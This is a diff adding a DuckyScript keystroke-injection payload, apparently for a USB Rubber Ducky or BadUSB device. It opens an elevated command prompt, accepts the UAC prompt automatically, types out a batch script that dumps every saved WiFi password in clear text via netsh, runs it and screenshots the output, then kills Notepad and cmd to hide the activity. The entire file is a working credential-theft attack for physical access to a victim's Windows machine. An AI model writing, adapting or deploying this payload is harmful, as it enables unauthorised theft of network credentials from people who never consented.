@@ -1,0 +1,197 @@
+DELAY 750
+GUI r
+DELAY 300
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 600
+ALT y
+DELAY 500
+STRING start notepad.exe
+ENTER
+DELAY 500
+STRING @echo off
+ENTER
+ENTER
+STRING ::
+ENTER 
+STRING :: (c) Elias Bachaalany <lallousz-x86@yahoo.com>
+ENTER 
+STRING :: Batchography: The Art of Batch Files Programming
+ENTER
+STRING ::
+ENTER
+ENTER
+STRING setlocal enabledelayedexpansion
+ENTER
+ENTER
+STRING :main
+ENTER
+STRING     title WiFiPasswordReveal v1.0 (c) lallouslab.net - The Batchography book
+ENTER
+ENTER
+STRING     echo.
+ENTER
+STRING     echo Reveal all saved WiFi passwords Batch file script v1.0 (c) lallouslab.net
+ENTER
+STRING     echo.
+ENTER
+STRING     echo Inspired by the book "Batchography: The Art of Batch Files Programming"
+ENTER
+STRING     echo.
+ENTER
+ENTER
+STRING     :: Get all the profiles
+ENTER
+STRING     call :get-profiles r
+ENTER
+ENTER
+STRING     :: For each profile, try to get the password
+ENTER
+STRING     :main-next-profile
+ENTER
+STRING         for /f "tokens=1* delims=," %%a in ("%r%") do (
+ENTER
+STRING             call :get-profile-key "%%a" key
+ENTER
+STRING             if "!key!" NEQ "" (
+ENTER
+STRING                 echo WiFi: [%%a] Password: [!key!]
+ENTER
+STRING             )
+ENTER
+STRING             set r=%%b
+ENTER
+STRING         )
+ENTER
+STRING         if "%r%" NEQ "" goto main-next-profile
+ENTER
+ENTER
+STRING     echo.
+ENTER
+STRING     pause
+ENTER
+ENTER
+STRING     goto :eof
+ENTER
+ENTER
+STRING ::
+ENTER
+STRING :: Get the WiFi key of a given profile
+ENTER
+STRING :get-profile-key <1=profile-name> <2=out-profile-key>
+ENTER
+STRING     setlocal
+ENTER
+ENTER
+STRING     set result=
+ENTER
+ENTER
+STRING     FOR /F "usebackq tokens=2 delims=:" %%a in (
+ENTER
+STRING         `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (
+ENTER
+STRING         set result=%%a
+ENTER
+STRING         set result=!result:~1! 
+ENTER
+STRING     )
+ENTER
+STRING     (
+ENTER
+STRING         endlocal
+ENTER
+STRING         set %2=%result%
+ENTER
+STRING     )
+ENTER
+ENTER
+STRING     goto :eof
+ENTER
+ENTER
+STRING ::
+ENTER
+STRING :: Get all network profiles (comma separated) into the result result-variable
+ENTER
+STRING :get-profiles <1=result-variable>
+ENTER
+STRING     setlocal
+ENTER
+ENTER
+STRING     set result=
+ENTER
+ENTER
+ENTER
+STRING     FOR /F "usebackq tokens=2 delims=:" %%a in (
+ENTER
+STRING         `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (
+ENTER
+STRING         set val=%%a
+ENTER
+STRING         set val=!val:~1!
+ENTER
+ENTER
+STRING         set result=%!val!,!result!
+ENTER
+STRING     )
+ENTER
+STRING     (
+ENTER
+STRING         endlocal
+ENTER
+STRING         set %1=%result:~0,-1%
+ENTER
+STRING     )
+ENTER
+STRING     goto :eof
+CTRL s
+DELAY 300
+STRING wifi.bat
+ENTER
+DELAY 500
+ALT y
+DELAY 600
+GUI r
+DELAY 200
+STRING cmd
+DELAY 100
+ENTER
+DELAY 700
+STRING start wifi.bat
+ENTER
+DELAY 10000
+GUI PRINTSCREEN
+DELAY 500
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 500
+CTRL ESCAPE
+DELAY 500
+STRING %USERPROFILE%\OneDrive\Pictures\Screenshots
+DELAY 500
+ENTER
+ENTER
+DELAY 2000
+CTRL ESCAPE
+DELAY 500
+STRING %USERPROFILE%\Pictures\Screenshots
+DELAY 500
+ENTER
+DELAY 500
+CTRL ESCAPE
+DELAY 100
+STRING /cmd
+DELAY 200
+ENTER
+DELAY 750
+STRING taskkill /f /im notepad.exe
+ENTER
+DELAY 1000
+STRING taskkill /f /im notepad.exe
+ENTER
+DELAY 500
+STRING taskkill /f /im cmd.exe
+ENTER 
+
+
